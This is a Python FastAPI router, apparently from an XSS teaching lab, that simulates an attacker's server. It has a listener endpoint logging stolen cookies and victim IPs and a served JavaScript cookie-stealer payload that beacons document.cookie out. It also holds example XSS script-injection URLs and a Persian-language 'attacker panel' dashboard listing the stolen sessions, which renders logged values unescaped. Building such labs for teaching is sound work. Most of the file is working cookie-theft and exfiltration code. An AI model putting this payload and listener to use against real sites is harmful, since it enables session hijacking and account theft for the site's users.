"""
Hacker Router - Simulates an attacker's server.
This receives stolen cookies and session data from XSS attacks.

⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️
"""
from datetime import datetime
from typing import Optional
from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, JSONResponse

router = APIRouter(prefix="/hacker", tags=["hacker"])

# In-memory storage for stolen data (simulates attacker's database)
stolen_data_log: list = []


@router.get("/log", response_class=HTMLResponse)
async def hacker_log_endpoint(
    request: Request,
    cookie: Optional[str] = Query(None, description="Stolen cookie value"),
    data: Optional[str] = Query(None, description="Any stolen data"),
    victim_url: Optional[str] = Query(None, description="URL where attack occurred")
):
    """
    🔴 HACKER LISTENER ENDPOINT
    
    This endpoint simulates an attacker's server that receives
    stolen cookies and data from XSS attacks.
    
    Example malicious URL:
    /?q=<script>fetch('/hacker/log?cookie='+document.cookie)</script>
    """
    # Get attacker info
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    victim_ip = request.client.host if request.client else "unknown"
    
    # Create log entry
    log_entry = {
        "timestamp": timestamp,
        "victim_ip": victim_ip,
        "stolen_cookie": cookie,
        "stolen_data": data,
        "victim_url": victim_url,
        "full_query": str(request.query_params)
    }
    
    # Store in memory
    stolen_data_log.append(log_entry)
    
    # Print to console (simulates attacker seeing the data)
    print("\n" + "💀" * 30)
    print("🚨 STOLEN DATA RECEIVED 🚨")
    print("💀" * 30)
    print(f"⏰ Time: {timestamp}")
    print(f"🌐 Victim IP: {victim_ip}")
    print(f"🍪 Stolen Cookie: {cookie}")
    print(f"📦 Stolen Data: {data}")
    print(f"🔗 Victim URL: {victim_url}")
    print("💀" * 30 + "\n")
    
    # Return a 1x1 transparent pixel (so it looks like a tracking pixel)
    # This makes the attack less noticeable
    return HTMLResponse(
        content="",
        status_code=200,
        headers={"Content-Type": "text/html"}
    )


@router.get("/log.js", response_class=HTMLResponse)
async def hacker_log_js():
    """
    Returns a JavaScript payload that steals cookies.
    Attacker can inject: <script src="/hacker/log.js"></script>
    """
    js_code = """
// Cookie Stealer Script
(function() {
    var stolen = document.cookie;
    var url = window.location.href;
    var img = new Image();
    img.src = '/hacker/log?cookie=' + encodeURIComponent(stolen) + 
              '&victim_url=' + encodeURIComponent(url);
})();
"""
    return HTMLResponse(
        content=js_code,
        media_type="application/javascript"
    )


@router.get("/dashboard", response_class=HTMLResponse)
async def hacker_dashboard():
    """
    🔴 HACKER DASHBOARD
    Shows all stolen data collected from XSS attacks.
    """
    html_content = """
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>💀 پنل مهاجم</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css">
        <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
        <style>
            * { font-family: 'Vazirmatn', monospace; }
            body { 
                background: linear-gradient(135deg, #1a1a1a 0%, #2d0000 100%); 
                min-height: 100vh;
                color: #00ff00;
            }
            .hacker-card {
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #00ff00;
                border-radius: 10px;
                margin: 10px 0;
                padding: 15px;
            }
            .stolen-cookie {
                background: #1a1a1a;
                color: #ff0000;
                padding: 10px;
                border-radius: 5px;
                font-family: monospace;
                word-break: break-all;
                direction: ltr;
                text-align: left;
            }
            h1 { color: #ff0000; }
            .refresh-btn {
                background: #ff0000;
                border: none;
                color: white;
            }
        </style>
    </head>
    <body>
        <div class="container py-5">
            <h1 class="text-center mb-4">💀 پنل مهاجم - داده‌های سرقت شده</h1>
            
            <div class="text-center mb-4">
                <button onclick="location.reload()" class="btn refresh-btn">
                    🔄 بروزرسانی
                </button>
                <a href="/hacker/clear" class="btn btn-outline-danger">
                    🗑️ پاک کردن لاگ‌ها
                </a>
            </div>
            
            <div class="alert alert-danger text-center">
                <strong>⚠️ این صفحه شبیه‌ساز سرور مهاجم است!</strong><br>
                داده‌های سرقت شده از حملات XSS در اینجا نمایش داده می‌شوند.
            </div>
    """
    
    if not stolen_data_log:
        html_content += """
            <div class="hacker-card text-center">
                <h4>📭 هنوز داده‌ای سرقت نشده</h4>
                <p>منتظر حمله XSS باشید...</p>
                <hr style="border-color: #00ff00;">
                <p>برای تست، این لینک را باز کنید:</p>
                <code class="stolen-cookie">
                    /vulnerable/search?q=&lt;script&gt;fetch('/hacker/log?cookie='+document.cookie)&lt;/script&gt;
                </code>
            </div>
        """
    else:
        for i, entry in enumerate(reversed(stolen_data_log), 1):
            html_content += f"""
            <div class="hacker-card">
                <h5>🎯 قربانی #{len(stolen_data_log) - i + 1}</h5>
                <table class="table table-dark table-sm">
                    <tr><td>⏰ زمان:</td><td>{entry['timestamp']}</td></tr>
                    <tr><td>🌐 IP قربانی:</td><td>{entry['victim_ip']}</td></tr>
                    <tr><td>🔗 URL:</td><td style="direction:ltr">{entry.get('victim_url', 'N/A')}</td></tr>
                </table>
                <p><strong>🍪 کوکی سرقت شده:</strong></p>
                <div class="stolen-cookie">{entry['stolen_cookie'] or 'N/A'}</div>
            </div>
            """
    
    html_content += """
        </div>
    </body>
    </html>
    """
    
    return HTMLResponse(content=html_content)


@router.get("/clear")
async def clear_stolen_data():
    """Clear all stolen data logs."""
    global stolen_data_log
    stolen_data_log = []
    print("🗑️ Stolen data log cleared!")
    return JSONResponse({"status": "cleared", "message": "All stolen data has been cleared"})


@router.get("/api/stolen")
async def get_stolen_data_api():
    """API endpoint to get all stolen data as JSON."""
    return JSONResponse({"stolen_data": stolen_data_log, "count": len(stolen_data_log)})
